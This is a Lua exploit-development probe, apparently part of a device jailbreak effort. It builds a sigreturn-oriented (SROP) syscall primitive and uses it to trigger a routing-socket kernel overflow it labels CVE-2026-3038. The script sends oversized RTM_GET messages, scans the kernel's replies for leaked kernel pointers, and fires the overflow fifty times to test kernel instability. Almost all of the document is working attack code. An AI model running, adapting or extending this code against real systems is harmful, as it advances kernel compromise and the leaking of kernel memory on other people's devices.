-- CRASH_CLASS: HIGH
-- PROBE 166a: Deep analysis of rtsock overflow (CVE-2026-3038)
--
-- 165b confirmed: RTM_GET with RTAX_AUTHOR sa_len=255 is ACCEPTED
-- by the kernel and the process SURVIVES. This is either:
-- a) No overflow (patched or different code path)
-- b) Overflow occurs but no stack canary catches it
-- c) Overflow occurs, canary exists, but response is generated before return
--
-- This probe:
-- A) Dumps full response for normal vs overflow RTM_GET
-- B) Tests if RTAX_AUTHOR appears in response
-- C) Tests rapid overflow triggers for kernel instability
-- D) Tests with specific patterns to detect stack corruption
-- E) Tests if kernel reads back from overflowed area (info leak)

print("=== PROBE 166a: RTSOCK DEEP ANALYSIS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function rd(addr) return to_num(memory.read_dword(addr)) end
local function rq(addr) return memory.read_qword(addr) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x800000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

local function pack4(b0, b1, b2, b3)
    return b0 + b1 * 256 + b2 * 65536 + b3 * 16777216
end

local HDR_LEN = 0x90

-- Create AF_ROUTE socket
local rtfd = srop(97, uint64(17), uint64(3), uint64(0))
local rtfdv = rtfd and to_num(rtfd) or -1
print("rt_socket=" .. rtfdv)
if rtfdv < 0 then print("=== DONE ==="); return end

-- [A] Normal RTM_GET with full response dump
print("")
print("--- [A] NORMAL RTM_GET DUMP ---")

local MSG = 0x50000
for off = 0, 0x1FF, 4 do wd(gpu + MSG + off, 0) end
wd(gpu + MSG + 0, pack4(0xA0, 0, 5, 4))  -- len=160, ver=5, type=RTM_GET
wd(gpu + MSG + 0x0C, 1)  -- RTA_DST
wd(gpu + MSG + 0x14, 1)  -- seq=1
local DST = MSG + HDR_LEN
wd(gpu + DST, pack4(16, 2, 0, 0))
wd(gpu + DST + 4, pack4(127, 0, 0, 1))

local wr = srop(4, uint64(rtfdv), ga(MSG), uint64(160))
print("write(normal)=" .. (wr and to_num(wr) or -999))

local RBUF = 0x60000
for off = 0, 0x3FF, 4 do wd(gpu + RBUF + off, 0) end
local rr = srop(3, uint64(rtfdv), ga(RBUF), uint64(0x400))
local rrv = rr and to_num(rr) or -999
print("read=" .. rrv)

if rrv > 0 then
    -- Dump header
    print("rtm_msglen=" .. (rd(gpu + RBUF) % 65536))
    print("rtm_version=" .. (math.floor(rd(gpu + RBUF) / 65536) % 256))
    print("rtm_type=" .. (math.floor(rd(gpu + RBUF) / 16777216) % 256))
    print("rtm_addrs=0x" .. string.format("%X", rd(gpu + RBUF + 0x0C)))
    print("rtm_pid=" .. rd(gpu + RBUF + 0x10))
    print("rtm_seq=" .. rd(gpu + RBUF + 0x14))
    print("rtm_errno=" .. rd(gpu + RBUF + 0x18))

    -- Dump sockaddrs after header
    print("sockaddrs:")
    local pos = HDR_LEN
    local addrs = rd(gpu + RBUF + 0x0C)
    for bit_idx = 0, 7 do
        local mask = math.floor(addrs / (2 ^ bit_idx)) % 2
        if mask == 1 and pos < rrv then
            local sa_len = rd(gpu + RBUF + pos) % 256
            local sa_fam = math.floor(rd(gpu + RBUF + pos) / 256) % 256
            local names = {"DST", "GATEWAY", "NETMASK", "GENMASK",
                "IFP", "IFA", "AUTHOR", "BRD"}
            print("  RTAX_" .. (names[bit_idx + 1] or tostring(bit_idx)) ..
                " pos=" .. string.format("%X", pos) ..
                " sa_len=" .. sa_len .. " sa_fam=" .. sa_fam)

            -- Dump sockaddr bytes
            local hex_str = ""
            for i = 0, math.min(sa_len - 1, 31) do
                local b = math.floor(rd(gpu + RBUF + pos + (i - i % 4)) /
                    (256 ^ (i % 4))) % 256
                hex_str = hex_str .. string.format("%02X ", b)
            end
            print("    " .. hex_str)

            -- Round up sa_len to 8-byte alignment for next sockaddr
            if sa_len == 0 then
                pos = pos + 8
            else
                pos = pos + math.floor((sa_len + 7) / 8) * 8
            end
        end
    end

    -- Scan all qwords for kernel pointers
    for off = 0, rrv - 8, 8 do
        local val = rq(gpu + RBUF + off)
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
            print("KPTR at +" .. string.format("%03X", off) ..
                "=0x" .. string.format("%X%08X", vh, vl))
        end
    end
end

-- [B] Overflow RTM_GET with RTAX_AUTHOR sa_len=255, dump response
print("")
print("--- [B] OVERFLOW RTM_GET DUMP ---")

local MSG2 = 0x70000
for off = 0, 0x3FF, 4 do wd(gpu + MSG2 + off, 0) end
local total2 = HDR_LEN + 16 + 255
wd(gpu + MSG2 + 0, pack4(total2 % 256, math.floor(total2 / 256), 5, 4))
wd(gpu + MSG2 + 0x0C, 0x41)  -- RTA_DST | RTA_AUTHOR
wd(gpu + MSG2 + 0x14, 2)

-- DST sockaddr
local DST2 = MSG2 + HDR_LEN
wd(gpu + DST2, pack4(16, 2, 0, 0))
wd(gpu + DST2 + 4, pack4(127, 0, 0, 1))

-- AUTHOR sockaddr with unique byte pattern
local AUTH = DST2 + 16
wd(gpu + AUTH, pack4(255, 2, 0, 0))  -- sa_len=255, family=AF_INET
-- Fill with sequential pattern: byte N = N
for off = 4, 252, 4 do
    local b0 = (off) % 256
    local b1 = (off + 1) % 256
    local b2 = (off + 2) % 256
    local b3 = (off + 3) % 256
    wd(gpu + AUTH + off, pack4(b0, b1, b2, b3))
end

local wr2 = srop(4, uint64(rtfdv), ga(MSG2), uint64(total2))
print("write(overflow)=" .. (wr2 and to_num(wr2) or -999))

local RBUF2 = 0x80000
for off = 0, 0x7FF, 4 do wd(gpu + RBUF2 + off, 0) end
local rr2 = srop(3, uint64(rtfdv), ga(RBUF2), uint64(0x800))
local rr2v = rr2 and to_num(rr2) or -999
print("read=" .. rr2v)

if rr2v > 0 then
    print("rtm_addrs=0x" .. string.format("%X", rd(gpu + RBUF2 + 0x0C)))
    print("rtm_errno=" .. rd(gpu + RBUF2 + 0x18))

    -- Look for RTAX_AUTHOR in response
    local addrs2 = rd(gpu + RBUF2 + 0x0C)
    local has_author = math.floor(addrs2 / 64) % 2
    print("has_AUTHOR=" .. has_author)

    -- Dump all sockaddrs
    local pos = HDR_LEN
    for bit_idx = 0, 7 do
        local mask = math.floor(addrs2 / (2 ^ bit_idx)) % 2
        if mask == 1 and pos < rr2v then
            local sa_len = rd(gpu + RBUF2 + pos) % 256
            local sa_fam = math.floor(rd(gpu + RBUF2 + pos) / 256) % 256
            local names = {"DST", "GATEWAY", "NETMASK", "GENMASK",
                "IFP", "IFA", "AUTHOR", "BRD"}
            print("  RTAX_" .. (names[bit_idx + 1] or tostring(bit_idx)) ..
                " pos=" .. string.format("%X", pos) ..
                " sa_len=" .. sa_len .. " sa_fam=" .. sa_fam)

            -- Dump full sockaddr content (check for our pattern)
            local hex_str = ""
            local match_count = 0
            for i = 0, math.min(sa_len - 1, 63) do
                local b = math.floor(rd(gpu + RBUF2 + pos + (i - i % 4)) /
                    (256 ^ (i % 4))) % 256
                hex_str = hex_str .. string.format("%02X ", b)
                if i >= 4 and b == (i % 256) then
                    match_count = match_count + 1
                end
            end
            print("    " .. hex_str)
            if match_count > 10 then
                print("    *** PATTERN MATCH: " .. match_count ..
                    " bytes match our input ***")
                print("    *** AUTHOR CONTENT IS FROM OUR OVERSIZED SOCKADDR ***")
            end

            if sa_len == 0 then pos = pos + 8
            else pos = pos + math.floor((sa_len + 7) / 8) * 8 end
        end
    end

    -- Check if response contains data beyond normal size
    if rr2v > 200 then
        print("")
        print("*** RESPONSE LARGER THAN NORMAL (200 vs " .. rr2v .. ") ***")
        -- Extra data might contain kernel stack residue
        for off = 200, rr2v - 8, 8 do
            local val = rq(gpu + RBUF2 + off)
            local vh, vl = get_hi_lo(val)
            if vh ~= 0 or vl ~= 0 then
                print("  extra +" .. string.format("%03X", off) ..
                    "=0x" .. string.format("%X%08X", vh, vl))
                if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                    print("  *** KERNEL POINTER IN EXTRA DATA! ***")
                end
            end
        end
    end

    -- Full kernel pointer scan
    local kp = 0
    for off = 0, rr2v - 8, 8 do
        local val = rq(gpu + RBUF2 + off)
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
            kp = kp + 1
            print("KPTR at +" .. string.format("%03X", off) ..
                "=0x" .. string.format("%X%08X", vh, vl))
        end
    end
    print("total_kptrs=" .. kp)
end

-- [C] Rapid fire: 50 overflow triggers
print("")
print("--- [C] RAPID OVERFLOW (50x) ---")
local crashes = 0
for i = 1, 50 do
    local wrn = srop(4, uint64(rtfdv), ga(MSG2), uint64(total2))
    if wrn == nil then
        crashes = crashes + 1
        print("CRASH at iteration " .. i)
        break
    end
    -- Read response to drain
    srop(3, uint64(rtfdv), ga(RBUF2), uint64(0x800))
end
print("rapid_fire: " .. (50 - crashes) .. "/50 survived")

local alive_ok, alive_pid = pcall(function() return make_syscall(20)() end)
if alive_ok then
    print("alive=" .. to_num(alive_pid))
else
    print("*** PROCESS DEAD AFTER RAPID FIRE ***")
end

srop(6, uint64(rtfdv))
print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
